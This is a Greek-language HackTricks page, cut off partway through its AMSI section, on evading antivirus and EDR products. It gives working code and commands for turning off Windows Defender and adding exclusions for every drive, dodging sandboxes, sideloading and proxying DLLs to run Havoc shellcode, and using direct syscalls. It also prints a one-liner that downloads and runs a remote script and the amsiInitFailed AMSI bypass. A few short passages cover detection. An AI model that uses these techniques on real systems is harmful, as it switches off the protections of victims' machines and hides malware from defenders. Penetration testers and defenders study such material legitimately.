# Παράκαμψη antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε αρχικά από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Διακοπή του Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα εργαλείο για να σταματήσει τη λειτουργία του Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα εργαλείο για να σταματήσει τη λειτουργία του Windows Defender, προσποιούμενο ότι είναι άλλο AV.
- [Απενεργοποίηση του Defender αν είστε admin](basic-powershell-for-pentesters/README.md)

### Δέλεαρ UAC τύπου installer πριν από την παραβίαση του Defender

Δημόσια loaders που παρουσιάζονται ως cheats παιχνιδιών συχνά διανέμονται ως ανυπόγραφα installers Node.js/Nexe, οι οποίοι πρώτα **ζητούν από τον χρήστη αυξημένα δικαιώματα** και μετά απενεργοποιούν το Defender. Η διαδικασία είναι απλή:

1. Ελέγχουν αν υπάρχει περιβάλλον διαχειριστή με `net session`. Η εντολή πετυχαίνει μόνο όταν ο χρήστης διαθέτει δικαιώματα admin, επομένως η αποτυχία σημαίνει ότι το loader εκτελείται ως απλός χρήστης.
2. Κάνουν αμέσως επανεκκίνηση του ίδιου του loader με το ρήμα `RunAs`, ώστε να εμφανιστεί το αναμενόμενο αίτημα συγκατάθεσης UAC, διατηρώντας παράλληλα την αρχική γραμμή εντολών.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Τα θύματα πιστεύουν ήδη ότι εγκαθιστούν «cracked» λογισμικό, επομένως συνήθως αποδέχονται το αίτημα, δίνοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.<sup>[[26]](#references)</sup>

### Μαζικές εξαιρέσεις `MpPreference` για κάθε γράμμα μονάδας δίσκου

Μόλις αποκτήσει elevated δικαιώματα, μια αλυσίδα τύπου GachiLoader μεγιστοποιεί τα τυφλά σημεία του Defender αντί να απενεργοποιήσει εντελώς την υπηρεσία. Αρχικά, ο loader τερματίζει το GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) και στη συνέχεια προσθέτει **εξαιρετικά ευρείες εξαιρέσεις**, ώστε να μην είναι δυνατή η σάρωση κάθε προφίλ χρήστη, καταλόγου συστήματος και αφαιρούμενου δίσκου:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Βασικές παρατηρήσεις:

- Ο βρόχος διατρέχει κάθε προσαρτημένο σύστημα αρχείων (D:\, E:\, USB sticks κ.λπ.), επομένως **κάθε μελλοντικό payload που τοποθετείται οπουδήποτε στον δίσκο αγνοείται**.
- Ο αποκλεισμός της επέκτασης `.sys` είναι προνοητικός — οι attackers διατηρούν τη δυνατότητα να φορτώσουν αργότερα unsigned drivers χωρίς να χρειαστεί να πειράξουν ξανά το Defender.
- Όλες οι αλλαγές γίνονται στο `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας στα επόμενα στάδια να επιβεβαιώσουν ότι οι εξαιρέσεις διατηρούνται ή να τις διευρύνουν χωρίς να ενεργοποιήσουν ξανά το UAC.

Επειδή δεν διακόπτεται καμία υπηρεσία του Defender, οι απλοϊκοί έλεγχοι κατάστασης εξακολουθούν να αναφέρουν «το antivirus είναι ενεργό», παρόλο που ο έλεγχος σε πραγματικό χρόνο δεν εξετάζει ποτέ αυτές τις διαδρομές.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Σήμερα, τα AV χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο: static detection, δυναμική ανάλυση και, στα πιο προηγμένα EDR, behavioral analysis.

### **Static detection**

Το static detection επιτυγχάνεται με τον εντοπισμό γνωστών κακόβουλων συμβολοσειρών ή ακολουθιών bytes σε ένα binary ή script, καθώς και με την εξαγωγή πληροφοριών από το ίδιο το αρχείο (π.χ. περιγραφή αρχείου, όνομα εταιρείας, digital signatures, εικονίδιο, checksum κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να οδηγήσει ευκολότερα στον εντοπισμό σας, καθώς πιθανότατα έχουν ήδη αναλυθεί και επισημανθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι για να παρακάμψετε αυτό το είδος εντοπισμού:

- **Encryption**

Αν κρυπτογραφήσετε το binary, το AV δεν θα μπορεί να εντοπίσει το πρόγραμμά σας, αλλά θα χρειαστείτε κάποιο είδος loader για να το αποκρυπτογραφήσει και να το εκτελέσει στη μνήμη.

- **Obfuscation**

Μερικές φορές αρκεί να αλλάξετε ορισμένες συμβολοσειρές στο binary ή στο script σας για να περάσει το AV, αλλά αυτό μπορεί να είναι χρονοβόρο, ανάλογα με το τι προσπαθείτε να κάνετε obfuscate.

- **Custom tooling**

Αν αναπτύξετε τα δικά σας εργαλεία, δεν θα υπάρχουν γνωστά κακόβουλα signatures, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος για να ελέγξετε το static detection του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ουσιαστικά χωρίζει το αρχείο σε πολλά τμήματα και ζητά από το Defender να σαρώσει το καθένα ξεχωριστά. Έτσι, μπορεί να σας δείξει ακριβώς ποιες συμβολοσειρές ή ποια bytes στο binary σας επισημάνθηκαν.

Σας συνιστώ ανεπιφύλακτα να δείτε αυτή την [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με πρακτικές τεχνικές AV Evasion.

### Offline tests χαρακτηριστικών PE για static classifiers

Τα bytes ενός packed ή encrypted payload είναι μόνο μία από τις εισόδους ενός static classifier. Το EMBER2024 εξάγει χαρακτηριστικά PE, όπως imports, exports, sections, headers και δεδομένα Authenticode.<sup>[[48]](#references)</sup> Σε ένα πείραμα με loader, η προσθήκη 141 imports που έμοιαζαν αβλαβή μείωσε το malicious score του EMBER2024 κατά 93%, ενώ imports που σχετίζονται με malware το αύξησαν. Αυτό είναι αποτέλεσμα για το συγκεκριμένο μοντέλο και τα συγκεκριμένα δείγματα, όχι αξιόπιστη παράκαμψη κάποιου συγκεκριμένου προϊόντος AV/EDR.<sup>[[50]](#references)</sup>

Για ένα εξουσιοδοτημένο test loader, διατηρήστε σταθερά το payload και τη διαδρομή εκτέλεσης, αλλάξτε μία επιδιωκόμενη build variable ανά παραλλαγή και συγκρίνετε τα scores offline. Εξετάστε τα χαρακτηριστικά PE που προκύπτουν, καθώς μια αλλαγή στο build μπορεί να επηρεάσει περισσότερες από μία ομάδες χαρακτηριστικών.<sup>[[49]](#references)[[50]](#references)</sup> Για να διατηρήσετε τα επιδιωκόμενα imports στο IAT, καλέστε τα επιλεγμένα Win32 APIs από κώδικα που είναι προσβάσιμος. Μεταβάλλετε την επιλογή και κατανείμετε τα σημεία κλήσης σε διαφορετικά builds, αντί να δημιουργήσετε μια σταθερή camouflage function που μπορεί να γίνει signature. Το πείραμα ανέφερε επίσης χαμηλότερα scores με έγκυρο code signing, εγγραφές export και περισσότερες functions που αυξάνουν το μέγεθος του `.pdata`. Το μη έγκυρο signing είχε μικρή επίδραση, όπως και η επίδραση του `.pdata`.<sup>[[50]](#references)</sup>

Το package `thrember` παρέχει εξαγωγή χαρακτηριστικών και benchmark models. Αφού το εγκαταστήσετε, χρησιμοποιήστε το `thrember.download_models("models")` με έναν ήδη υπάρχοντα κατάλογο `models` και, στη συνέχεια, εκτελέστε τον scorer από τον γονικό κατάλογο: το helper λήψης αλλάζει τον τρέχοντα κατάλογο εργασίας. Ο PE classifier μπορεί να υπολογίσει score για έναν κατάλογο με builds χωρίς να τα υποβάλει σε υπηρεσία σάρωσης:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Keep τις εκδόσεις του model και του feature extractor σταθερές κατά τη σύγκριση. Μια χαμηλότερη offline βαθμολογία δείχνει μόνο πώς αντιδρά αυτός ο classifier στο τροποποιημένο binary· δεν αποδεικνύει αποφυγή του behavioral analysis, του emulation ή ενός διαφορετικού model ενός vendor.<sup>[[49]](#references)[[50]](#references)</sup> Για [polymorphism ανά build και καμουφλάζ του εξωτερικού binary σε virtualized payloads](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), δείτε το ξεχωριστό execution model.

### **Δυναμική ανάλυση**

Η δυναμική ανάλυση είναι όταν το AV εκτελεί το binary σας σε sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπάθεια αποκρυπτογράφησης και ανάγνωσης των κωδικών πρόσβασης του browser σας, εκτέλεση minidump του LSASS κ.λπ.). Αυτό το κομμάτι μπορεί να είναι λίγο πιο δύσκολο, αλλά ακολουθούν μερικά πράγματα που μπορείτε να κάνετε για να αποφύγετε τα sandboxes.

- **Αναμονή πριν από την εκτέλεση** Ανάλογα με τον τρόπο υλοποίησης, μπορεί να είναι ένας εξαιρετικός τρόπος παράκαμψης της δυναμικής ανάλυσης του AV. Τα AV έχουν πολύ λίγο χρόνο για να σαρώσουν αρχεία, ώστε να μην διακόπτουν τη ροή εργασίας του χρήστη, επομένως οι μεγάλες αναμονές μπορούν να διαταράξουν την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά AV sandboxes μπορούν απλώς να παρακάμψουν την αναμονή, ανάλογα με τον τρόπο υλοποίησής της.
- **Έλεγχος πόρων του μηχανήματος** Συνήθως τα sandboxes έχουν πολύ περιορισμένους πόρους (π.χ. < 2GB RAM), αλλιώς μπορεί να επιβραδύνουν το μηχάνημα του χρήστη. Μπορείτε επίσης να γίνετε πολύ δημιουργικοί, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμη και τις ταχύτητες των ανεμιστήρων· δεν θα είναι όλα υλοποιημένα στο sandbox.
- **Έλεγχοι ειδικοί για το μηχάνημα** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου ο σταθμός εργασίας είναι συνδεδεμένος στο domain "contoso.local", μπορείτε να ελέγξετε το domain του υπολογιστή για να δείτε αν αντιστοιχεί σε αυτό που ορίσατε. Αν δεν αντιστοιχεί, μπορείτε να κάνετε το πρόγραμμά σας να τερματιστεί.

Αποδεικνύεται ότι το όνομα υπολογιστή του Microsoft Defender Sandbox είναι HAL9TH. Επομένως, μπορείτε να ελέγξετε το όνομα του υπολογιστή στο malware σας πριν από την detonaton· αν το όνομα είναι HAL9TH, σημαίνει ότι βρίσκεστε μέσα στο sandbox του Defender, οπότε μπορείτε να κάνετε το πρόγραμμά σας να τερματιστεί.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές ακόμη πολύ καλές συμβουλές από τον [@mgeeky](https://twitter.com/mariuszbit) για την αντιμετώπιση των sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> κανάλι #malware-dev</p></figcaption></figure>

Όπως είπαμε και προηγουμένως σε αυτή την ανάρτηση, τα **public tools** αργά ή γρήγορα **εντοπίζονται**, επομένως θα πρέπει να αναρωτηθείτε το εξής:

Για παράδειγμα, αν θέλετε να κάνετε dump το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσετε το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε ένα λιγότερο γνωστό project που κάνει επίσης dump το LSASS;

Η σωστή απάντηση είναι πιθανότατα η δεύτερη. Για παράδειγμα, το mimikatz είναι μάλλον ένα από τα πιο επισημασμένα malware από τα AV και EDR, αν όχι το πιο επισημασμένο. Παρόλο που το ίδιο το project είναι εξαιρετικό, είναι επίσης εφιάλτης να το χρησιμοποιήσετε για να παρακάμψετε τα AV, οπότε απλώς αναζητήστε εναλλακτικές για αυτό που προσπαθείτε να πετύχετε.

> [!TIP]
> Όταν τροποποιείτε τα payloads σας για evasion, φροντίστε να **απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων** στο Defender και, παρακαλώ, σοβαρά, **ΜΗΝ ΑΝΕΒΑΖΕΤΕ ΣΤΟ VIRUSTOTAL** αν ο στόχος σας είναι να πετύχετε μακροπρόθεσμο evasion. Αν θέλετε να ελέγξετε αν το payload σας εντοπίζεται από ένα συγκεκριμένο AV, εγκαταστήστε το σε ένα VM, προσπαθήστε να απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων και δοκιμάστε το εκεί μέχρι να μείνετε ικανοποιημένοι με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατό, **προτιμάτε πάντα τη χρήση DLLs για evasion**. Από την εμπειρία μου, τα DLL αρχεία συνήθως **εντοπίζονται και αναλύονται πολύ λιγότερο**, επομένως πρόκειται για ένα πολύ απλό κόλπο που μπορείτε να χρησιμοποιήσετε για να αποφύγετε τον εντοπισμό σε ορισμένες περιπτώσεις (αν το payload σας μπορεί φυσικά να εκτελεστεί ως DLL).

Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από το Havoc έχει ποσοστό εντοπισμού 4/26 στο antiscan.me, ενώ το EXE payload έχει ποσοστό εντοπισμού 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>σύγκριση στο antiscan.me ενός κανονικού Havoc EXE payload με ένα κανονικό Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά κόλπα που μπορείτε να χρησιμοποιήσετε με DLL αρχεία για να γίνετε πολύ πιο stealthy.

## DLL Sideloading & Proxying

Το **DLL Sideloading** εκμεταλλεύεται τη σειρά αναζήτησης DLL που χρησιμοποιεί ο loader, τοποθετώντας την εφαρμογή-θύμα και τα κακόβουλα payloads δίπλα-δίπλα.

Μπορείτε να ελέγξετε για προγράμματα ευάλωτα σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων που είναι ευάλωτα σε DLL hijacking μέσα στο "C:\Program Files\\" και των αρχείων DLL που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε μόνοι σας προγράμματα που είναι ευάλωτα σε DLL Hijack/Sideload**, καθώς αυτή η τεχνική είναι αρκετά stealthy όταν εφαρμόζεται σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά προγράμματα που είναι ευάλωτα σε DLL Sideload, μπορεί να εντοπιστείτε εύκολα.

Αν απλώς τοποθετήσετε ένα κακόβουλο DLL με το όνομα ενός αρχείου που περιμένει να φορτώσει ένα πρόγραμμα, δεν θα φορτωθεί το payload σας, επειδή το πρόγραμμα περιμένει να βρει ορισμένες συγκεκριμένες συναρτήσεις μέσα σε αυτό το DLL. Για να διορθώσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και κακόβουλο) DLL στο αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντάς μας να χειριστούμε την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) του [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και την αρχική μετονομασμένη DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Αυτά είναι τα αποτελέσματα:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (κωδικοποιημένο με [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν Detection rate 0/26 στο [antiscan.me](https://antiscan.me)! Θα το θεωρούσα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Συνιστώ ανεπιφύλακτα** να παρακολουθήσετε το [twitch VOD του S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) σχετικά με το DLL Sideloading, καθώς και το [βίντεο του ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), για να μάθετε περισσότερα σε βάθος σχετικά με όσα συζητήσαμε.

### Κατάχρηση Forwarded Exports (ForwardSideLoading)

Οι μονάδες Windows PE μπορούν να εξάγουν συναρτήσεις που στην πραγματικότητα είναι «forwarders»: αντί να δείχνει σε κώδικα, η καταχώριση export περιέχει μια συμβολοσειρά ASCII της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει το export, ο Windows loader θα:

- Φορτώσει το `TargetDll`, αν δεν είναι ήδη φορτωμένο
- Επιλύσει το `TargetFunc` από αυτό

Βασικές συμπεριφορές που πρέπει να κατανοήσετε:
- Αν το `TargetDll` είναι KnownDLL, παρέχεται από τον προστατευμένο χώρο ονομάτων KnownDLLs (π.χ. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η συνήθης σειρά αναζήτησης DLL, η οποία περιλαμβάνει τον κατάλογο της μονάδας που εκτελεί την προώθηση.

Αυτό επιτρέπει μια έμμεση primitive sideloading: βρείτε ένα υπογεγραμμένο DLL που εξάγει μια συνάρτηση η οποία προωθείται σε όνομα μονάδας που δεν είναι KnownDLL και, στη συνέχεια, τοποθετήστε δίπλα του ένα DLL που ελέγχεται από τον επιτιθέμενο και έχει ακριβώς το όνομα του προωθούμενου module. Όταν κληθεί το forwarded export, ο loader επιλύει την προώθηση και φορτώνει το DLL σας από τον ίδιο κατάλογο, εκτελώντας το DllMain σας.<sup>[[13]](#references)</sup>

Παράδειγμα που παρατηρήθηκε στα Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` δεν είναι KnownDLL, επομένως επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (αντιγραφή-επικόλληση):
1) Αντιγράψτε την υπογεγραμμένη DLL του συστήματος σε έναν φάκελο με δυνατότητα εγγραφής
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο `DllMain` αρκεί για την εκτέλεση κώδικα· δεν χρειάζεται να υλοποιήσετε την προωθούμενη συνάρτηση για να ενεργοποιηθεί το `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Ενεργοποιήστε την προώθηση με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- Το rundll32 (signed) φορτώνει το side-by-side `keyiso.dll` (signed)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς το `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια, ο loader φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain` του
- Αν δεν έχει υλοποιηθεί το `SetAuditingInterface`, θα εμφανιστεί σφάλμα "missing API" μόνο αφού έχει ήδη εκτελεστεί το `DllMain`

Hunting tips:
- Εστιάστε σε forwarded exports όπου το target module δεν είναι KnownDLL. Τα KnownDLL παρατίθενται στο `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε το inventory των forwarder των Windows 11 για να αναζητήσετε υποψήφια: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ιδέες για εντοπισμό/άμυνα:
- Παρακολουθείτε τα LOLBins (π.χ. rundll32.exe) που φορτώνουν υπογεγραμμένα DLL από διαδρομές εκτός συστήματος και στη συνέχεια φορτώνουν μη-KnownDLLs με το ίδιο βασικό όνομα από αυτόν τον κατάλογο
- Ειδοποιείτε για αλυσίδες διεργασιών/μονάδων όπως: `rundll32.exe` → `keyiso.dll` εκτός συστήματος → `NCRYPTPROV.dll` σε διαδρομές όπου μπορούν να εγγράψουν οι χρήστες
- Επιβάλλετε πολιτικές ακεραιότητας κώδικα (WDAC/AppLocker) και απαγορεύετε την εγγραφή και εκτέλεση στους καταλόγους εφαρμογών

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με διακριτικό τρόπο.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Το evasion είναι απλώς ένα παιχνίδι γάτας και ποντικιού: ό,τι λειτουργεί σήμερα μπορεί να εντοπίζεται αύριο, οπότε μην βασίζεστε ποτέ σε ένα μόνο εργαλείο. Αν είναι δυνατό, δοκιμάστε να συνδυάσετε πολλαπλές τεχνικές evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Τα EDR συχνά τοποθετούν **inline hooks σε user mode** στα syscall stubs του `ntdll.dll`. Για να παρακάμψετε αυτά τα hooks, μπορείτε να δημιουργήσετε **direct** ή **indirect** syscall stubs που φορτώνουν το σωστό **SSN** (System Service Number) και μεταβαίνουν σε kernel mode χωρίς να εκτελούν το hooked export entrypoint.<sup>[[32]](#references)</sup>

**Επιλογές κλήσης:**
- **Direct (embedded)**: εκπέμπει μια εντολή `syscall`/`sysenter`/`SVC #0` στο παραγόμενο stub (χωρίς πρόσβαση σε export του `ntdll`).
- **Indirect**: μεταβαίνει σε ένα υπάρχον `syscall` gadget μέσα στο `ntdll`, ώστε η μετάβαση στον kernel να φαίνεται ότι προέρχεται από το `ntdll` (χρήσιμο για evasion ευρετικών μεθόδων). Το **randomized indirect** επιλέγει ένα gadget από ένα pool σε κάθε κλήση.
- **Egg-hunt**: αποφεύγει την ενσωμάτωση της στατικής ακολουθίας opcode `0F 05` στον δίσκο και εντοπίζει μια ακολουθία syscall κατά τον χρόνο εκτέλεσης.

**Στρατηγικές ανθεκτικής στα hooks επίλυσης SSN:**
- **FreshyCalls (VA sort)**: συνάγει τα SSN ταξινομώντας τα syscall stubs βάσει της εικονικής διεύθυνσής τους, αντί να διαβάζει τα bytes των stubs.
- **SyscallsFromDisk**: κάνει map ένα καθαρό `\KnownDlls\ntdll.dll`, διαβάζει τα SSN από το `.text` και έπειτα κάνει unmap (παρακάμπτει όλα τα hooks στη μνήμη).
- **RecycledGate**: συνδυάζει τη συναγωγή SSN μέσω ταξινόμησης VA με επικύρωση opcode όταν ένα stub είναι καθαρό. Αν έχει γίνει hook, χρησιμοποιεί ως εναλλακτική τη συναγωγή μέσω VA.
- **HW Breakpoint**: ορίζει το DR0 στην εντολή `syscall` και χρησιμοποιεί ένα VEH για να καταγράψει το SSN από το `EAX` κατά τον χρόνο εκτέλεσης, χωρίς ανάλυση hooked bytes.

Παράδειγμα χρήσης του SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για να αποτρέπει το "[malware χωρίς αρχεία](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AV μπορούσαν να σαρώνουν μόνο **αρχεία στον δίσκο**, οπότε, αν μπορούσες με κάποιον τρόπο να εκτελέσεις payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε επαρκή ορατότητα.

Η λειτουργία AMSI είναι ενσωματωμένη στα εξής στοιχεία των Windows.

- User Account Control, ή UAC (ανύψωση δικαιωμάτων για εγκατάσταση EXE, COM, MSI ή ActiveX)
- PowerShell (scripts, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
- Windows Script Host (wscript.exe και cscript.exe)
- JavaScript και VBScript
- Μακροεντολές Office VBA

Επιτρέπει στις λύσεις antivirus να επιθεωρούν τη συμπεριφορά των scripts, εκθέτοντας το περιεχόμενό τους σε μορφή που είναι τόσο αποκρυπτογραφημένη όσο και αποσυσκοτισμένη.

Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα εμφανίσει την παρακάτω ειδοποίηση στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προσθέτει το `amsi:` και, στη συνέχεια, τη διαδρομή προς το εκτελέσιμο αρχείο από το οποίο εκτελέστηκε το script, στην προκειμένη περίπτωση, το powershell.exe

Δεν αποθηκεύσαμε κανένα αρχείο στον δίσκο, αλλά και πάλι εντοπιστήκαμε στη μνήμη λόγω του AMSI.

Επιπλέον, από την έκδοση **.NET 4.8** και μετά, ο κώδικας C# περνά επίσης από το AMSI. Αυτό επηρεάζει ακόμη και τη χρήση της `Assembly.Load(byte[])` για φόρτωση και εκτέλεση στη μνήμη. Γι' αυτό συνιστάται η χρήση παλαιότερων εκδόσεων του .NET (όπως η 4.7.2 ή παλαιότερη) για εκτέλεση στη μνήμη, αν θέλετε να παρακάμψετε το AMSI.

Υπάρχουν μερικοί τρόποι παράκαμψης του AMSI:

- **Obfuscation**

Καθώς το AMSI βασίζεται κυρίως σε στατικές ανιχνεύσεις, η τροποποίηση των scripts που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος αποφυγής της ανίχνευσης.

Ωστόσο, το AMSI μπορεί να αποσυσκοτίσει scripts ακόμη κι αν έχουν πολλά επίπεδα, οπότε το obfuscation μπορεί να είναι κακή επιλογή, ανάλογα με τον τρόπο εφαρμογής του. Αυτό κάνει την παράκαμψή του όχι και τόσο απλή. Παρ' όλα αυτά, μερικές φορές αρκεί να αλλάξετε μερικά ονόματα μεταβλητών και θα είστε εντάξει, οπότε εξαρτάται από το πόσο έχει επισημανθεί κάτι.

- **AMSI Bypass**

Καθώς το AMSI υλοποιείται με τη φόρτωση ενός DLL στη διεργασία powershell (καθώς και στις cscript.exe, wscript.exe κ.λπ.), είναι εύκολο να αλλοιωθεί, ακόμη και με μη προνομιούχο χρήστη. Λόγω αυτού του ελαττώματος στην υλοποίηση του AMSI, οι ερευνητές έχουν βρει πολλούς τρόπους παράκαμψης της σάρωσης AMSI.

**Επιβολή σφάλματος**

Η επιβολή αποτυχίας της αρχικοποίησης του AMSI (amsiInitFailed) έχει ως αποτέλεσμα να μην ξεκινήσει καμία σάρωση για την τρέχουσα διεργασία. Αυτό αποκαλύφθηκε αρχικά από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft ανέπτυξε μια υπογραφή για να αποτρέψει την ευρύτερη χρήση του.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

